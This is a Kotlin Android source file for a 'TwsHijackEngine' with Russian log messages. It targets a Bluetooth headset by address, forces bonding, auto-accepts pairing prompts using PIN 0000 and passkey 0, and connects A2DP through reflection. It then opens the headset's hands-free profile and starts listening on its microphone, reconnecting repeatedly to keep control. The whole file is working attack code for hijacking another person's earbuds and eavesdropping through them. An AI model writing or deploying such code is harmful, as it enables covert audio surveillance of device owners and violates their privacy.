package com.droid.dolphy.bluetooth.whisperpair

import com.droid.dolphy.R
import android.annotation.SuppressLint
import android.bluetooth.BluetoothA2dp
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import androidx.core.content.ContextCompat
import kotlin.coroutines.coroutineContext
import kotlinx.coroutines.*

class TwsHijackEngine(private val context: Context) {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var job: Job? = null

    @Volatile
    private var isRunning = false

    @Volatile
    private var hfpConnected = false

    private var targetDevice: BluetoothDevice? = null
    private var a2dpProfile: BluetoothA2dp? = null
    private var pairingReceiver: BroadcastReceiver? = null

    private val audioManager = BluetoothAudioManager(context)

    private val adapter: BluetoothAdapter?
        get() = (context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter

    fun hijack(address: String, onLog: (String) -> Unit) {
        if (isRunning) return
        isRunning = true
        job = scope.launch { run(address, onLog) }
    }

    fun stop() {
        isRunning = false
        job?.cancel()
        job = null
        unregisterPairingReceiver()
        runCatching { audioManager.stopListening() }
        runCatching { audioManager.disconnect() }
        runCatching { audioManager.release() }
        targetDevice?.let { d ->
            runCatching {
                a2dpProfile?.let { a2dp ->
                    BluetoothA2dp::class.java
                        .getMethod("disconnect", BluetoothDevice::class.java)
                        .invoke(a2dp, d)
                }
            }
        }
        runCatching {
            a2dpProfile?.let { adapter?.closeProfileProxy(BluetoothProfile.A2DP, it) }
        }
        a2dpProfile = null
        targetDevice = null
    }

    private suspend fun post(onLog: (String) -> Unit, message: String) {
        withContext(Dispatchers.Main) { onLog(message) }
    }

    @SuppressLint("MissingPermission")
    private suspend fun run(address: String, onLog: (String) -> Unit) {
        val safeLog: (String) -> Unit = { msg -> if (isRunning) scope.launch { post(onLog, msg) } }

        val adapter = adapter
        if (adapter == null || !adapter.isEnabled) {
            post(onLog, context.getString(R.string.x_twshijackengine_bluetooth_1207))
            isRunning = false
            return
        }
        val device = runCatching { adapter.getRemoteDevice(address) }.getOrNull()
        if (device == null) {
            post(onLog, context.getString(R.string.x_twshijackengine_str_eb24))
            isRunning = false
            return
        }
        targetDevice = device

        safeLog("Цель: ${runCatching { device.name }.getOrNull() ?: "устройство"} [$address]")
        runCatching { adapter.cancelDiscovery() }
        registerPairingReceiver(device, safeLog)

        if (!ensureBonded(device, safeLog)) {
            isRunning = false
            return
        }

        safeLog(context.getString(R.string.x_twshijackengine_a2dp_c559))
        val a2dp = awaitA2dpProxy(adapter)
        if (a2dp != null) {
            val started = connectA2dpReflect(a2dp, device)
            safeLog(if (started) context.getString(R.string.x_twshijackengine_a2dp_76d5) else context.getString(R.string.x_twshijackengine_a2dp_connect_b711))
            if (awaitA2dpConnected(a2dp, device, 12000)) {
                safeLog(context.getString(R.string.x_twshijackengine_a2dp_4010))
            } else {
                safeLog(context.getString(R.string.x_twshijackengine_a2dp_6e30))
            }
        } else {
            safeLog(context.getString(R.string.x_twshijackengine_a2dp_4b3b))
        }

        val onHfpState: (BluetoothAudioManager.AudioState) -> Unit = { state ->
            when (state) {
                is BluetoothAudioManager.AudioState.Connected -> {
                    hfpConnected = true
                    safeLog(context.getString(R.string.x_twshijackengine_hfp_db51))
                    runCatching {
                        audioManager.startListening { listenState ->
                            when (listenState) {
                                is BluetoothAudioManager.AudioState.Listening ->
                                    safeLog(context.getString(R.string.x_twshijackengine_mic_9283))
                                is BluetoothAudioManager.AudioState.Error ->
                                    safeLog("MIC: ${listenState.message}")
                                else -> {}
                            }
                        }
                    }
                }
                is BluetoothAudioManager.AudioState.Connecting -> safeLog(context.getString(R.string.x_twshijackengine_hfp_1bee))
                is BluetoothAudioManager.AudioState.Error -> {
                    hfpConnected = false
                    safeLog("HFP: ${state.message}")
                }
                is BluetoothAudioManager.AudioState.Disconnected -> hfpConnected = false
                else -> {}
            }
        }

        safeLog(context.getString(R.string.x_twshijackengine_hfp_8374))
        if (awaitAudioManagerReady()) {
            audioManager.connectAudioProfile(address, onHfpState)
        } else {
            safeLog(context.getString(R.string.x_twshijackengine_hfp_4463))
        }

        var a2dpRetries = 0
        var hfpRetries = 0
        var lastHfpTry = 0L
        var lastStatus = 0L
        while (coroutineContext.isActive && isRunning) {
            delay(1500)
            val now = System.currentTimeMillis()

            if (a2dp != null) {
                val st = runCatching { a2dp.getConnectionState(device) }.getOrNull()
                if (st != BluetoothProfile.STATE_CONNECTED && st != BluetoothProfile.STATE_CONNECTING) {
                    if (a2dpRetries < 8) {
                        a2dpRetries++
                        safeLog("A2DP: канал потерян — реконнект $a2dpRetries/8")
                        runCatching { connectA2dpReflect(a2dp, device) }
                    }
                } else {
                    a2dpRetries = 0
                }
            }

            if (!hfpConnected && !audioManager.isHfpConnected(address) &&
                now - lastHfpTry > 10000 && hfpRetries < 5
            ) {
                hfpRetries++
                lastHfpTry = now
                safeLog("HFP: реконнект $hfpRetries/5")
                audioManager.connectAudioProfile(address, onHfpState)
            }

            if (now - lastStatus > 8000) {
                lastStatus = now
                val a2dpState = runCatching { a2dp?.getConnectionState(device) }.getOrNull()
                safeLog(
                    "Статус: A2DP=${stateName(a2dpState)} · HFP=${if (audioManager.isHfpConnected(address)) "OK" else "нет"}",
                )
            }
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun ensureBonded(device: BluetoothDevice, log: (String) -> Unit): Boolean {
        when (runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)) {
            BluetoothDevice.BOND_BONDED -> return true
            BluetoothDevice.BOND_BONDING -> log(context.getString(R.string.x_twshijackengine_str_4e69))
            else -> {
                log(context.getString(R.string.x_twshijackengine_str_8560))
                val started = runCatching { device.createBond() }.getOrDefault(false)
                if (!started) {
                    log(context.getString(R.string.x_twshijackengine_str_a914))
                    return false
                }
            }
        }
        val deadline = System.currentTimeMillis() + 25000
        while (coroutineContext.isActive && isRunning && System.currentTimeMillis() < deadline) {
            val state = runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)
            if (state == BluetoothDevice.BOND_BONDED) {
                log(context.getString(R.string.x_twshijackengine_str_98ad))
                return true
            }
            delay(400)
        }
        log(context.getString(R.string.x_twshijackengine_25_c10f))
        return false
    }

    @SuppressLint("MissingPermission")
    private fun registerPairingReceiver(target: BluetoothDevice, log: (String) -> Unit) {
        unregisterPairingReceiver()
        pairingReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                if (intent.action != BluetoothDevice.ACTION_PAIRING_REQUEST) return
                val device: BluetoothDevice? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                }
                if (device == null || device.address != target.address) return
                val variant = intent.getIntExtra(
                    BluetoothDevice.EXTRA_PAIRING_VARIANT,
                    BluetoothDevice.ERROR,
                )
                log("Запрос пары (вариант $variant) — подтверждаю автоматически")
                try {
                    when {
                        variant == BluetoothDevice.PAIRING_VARIANT_PIN || variant == 0 || variant == 7 -> {
                            runCatching { device.setPin("0000".toByteArray(Charsets.UTF_8)) }
                            runCatching {
                                device.javaClass
                                    .getMethod("setPasskey", Int::class.javaPrimitiveType)
                                    .invoke(device, 0)
                            }
                        }
                        else -> {
                            runCatching { device.setPairingConfirmation(true) }
                            runCatching { device.setPin("0000".toByteArray(Charsets.UTF_8)) }
                        }
                    }
                    runCatching { abortBroadcast() }
                } catch (t: Throwable) {
                }
            }
        }
        ContextCompat.registerReceiver(
            context,
            pairingReceiver!!,
            IntentFilter(BluetoothDevice.ACTION_PAIRING_REQUEST),
            ContextCompat.RECEIVER_EXPORTED,
        )
    }

    private fun unregisterPairingReceiver() {
        pairingReceiver?.let { runCatching { context.unregisterReceiver(it) } }
        pairingReceiver = null
    }

    @SuppressLint("MissingPermission")
    private suspend fun awaitA2dpProxy(adapter: BluetoothAdapter): BluetoothA2dp? {
        val deferred = CompletableDeferred<BluetoothA2dp?>()
        val listener = object : BluetoothProfile.ServiceListener {
            override fun onServiceConnected(profile: Int, proxy: BluetoothProfile) {
                a2dpProfile = proxy as? BluetoothA2dp
                deferred.complete(a2dpProfile)
            }

            override fun onServiceDisconnected(profile: Int) {
                a2dpProfile = null
            }
        }
        return runCatching {
            adapter.getProfileProxy(context, listener, BluetoothProfile.A2DP)
            withTimeoutOrNull(6000) { deferred.await() }
        }.getOrNull()
    }

    @SuppressLint("MissingPermission")
    private fun connectA2dpReflect(a2dp: BluetoothA2dp, device: BluetoothDevice): Boolean {
        return runCatching {
            BluetoothA2dp::class.java
                .getMethod("connect", BluetoothDevice::class.java)
                .invoke(a2dp, device) as? Boolean ?: false
        }.getOrDefault(false)
    }

    @SuppressLint("MissingPermission")
    private suspend fun awaitA2dpConnected(a2dp: BluetoothA2dp, device: BluetoothDevice, timeoutMs: Long): Boolean {
        val deadline = System.currentTimeMillis() + timeoutMs
        while (coroutineContext.isActive && isRunning && System.currentTimeMillis() < deadline) {
            val st = runCatching { a2dp.getConnectionState(device) }
                .getOrDefault(BluetoothProfile.STATE_DISCONNECTED)
            if (st == BluetoothProfile.STATE_CONNECTED) return true
            delay(500)
        }
        return false
    }

    private suspend fun awaitAudioManagerReady(): Boolean {
        val deferred = CompletableDeferred<Boolean>()
        runCatching { audioManager.initialize { ready -> deferred.complete(ready) } }
        return withTimeoutOrNull(6000) { deferred.await() } ?: false
    }

    private fun stateName(state: Int?): String = when (state) {
        BluetoothProfile.STATE_CONNECTED -> "CONNECTED"
        BluetoothProfile.STATE_CONNECTING -> "CONNECTING"
        BluetoothProfile.STATE_DISCONNECTING -> "DISCONNECTING"
        BluetoothProfile.STATE_DISCONNECTED -> "DISCONNECTED"
        else -> "?"
    }
}
